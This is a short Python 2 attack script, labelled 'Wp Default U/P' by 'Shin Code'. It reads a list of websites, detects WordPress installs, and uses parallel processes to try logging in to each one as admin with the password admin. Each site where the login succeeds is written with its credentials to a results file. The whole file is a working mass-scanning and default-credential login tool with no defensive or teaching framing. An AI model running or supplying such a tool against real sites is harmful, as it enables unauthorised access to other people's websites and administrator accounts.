import requests,time
from colorama import Fore, init
from multiprocessing import Pool
init(autoreset=True)


def login(site):
	try:
		datane = {'log':'admin',
		'pwd':'admin',
		'wp-submit':'Log+In',
		'redirect_to':site+'/wp-admin',
		'testcookie':'1'}
		response = requests.post(site + "/wp-login.php", data=datane,headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'},timeout=10)
		result = response.status_code
		if result == 302:
			with open("result.txt", "a") as result_file:
				result_file.write(site+'/wp-login.php'+'|'+'admin'+'|'+'admin'+'\n')
			print(Fore.GREEN+"{} [admin:pass]".format(site))
		else:
			print(Fore.RED+"{} [Failed]".format(site))
	except:
		pass

def check(site):
	try:
		response = requests.get(site + "/wp-admin/install.php",headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'},timeout=10)
		result = response.content.split('<h1>')[1].split('</h1>')[0]
		if result == "Already Installed":
			print(Fore.YELLOW+ "{} [Wordpress]".format(site))
			login(site)
		else:
			print(Fore.RED+"{} [Another Cms]".format(site))
	except:
		pass
			
def process_site(site):
	site = site.strip()
	if not site.startswith(('http://', 'https://')):
		site = 'http://' + site
	check(site)

if __name__ == '__main__':
	print "{} Wp Default U/P | {}Shin Code\n".format(Fore.YELLOW,Fore.CYAN)
	file = raw_input("File: ")
	with open(file, "r") as file_content:
		sites = file_content.readlines()
	pool = Pool(int(20))
	pool.map(process_site, sites)
	pool.close()
	pool.join()
